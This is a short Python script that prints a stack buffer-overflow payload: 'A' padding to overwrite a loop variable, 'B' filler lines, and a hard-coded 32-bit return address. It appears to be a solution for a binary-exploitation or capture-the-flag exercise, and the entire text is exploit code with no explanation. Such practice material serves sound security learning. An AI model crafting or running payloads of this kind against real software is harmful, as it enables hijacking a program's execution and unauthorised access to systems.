loop_overwrite = "A"*14+"\n"

filler = "B\n"*23

exploit = "\xfd\x86\x04\x08"

print (loop_overwrite + filler + exploit)
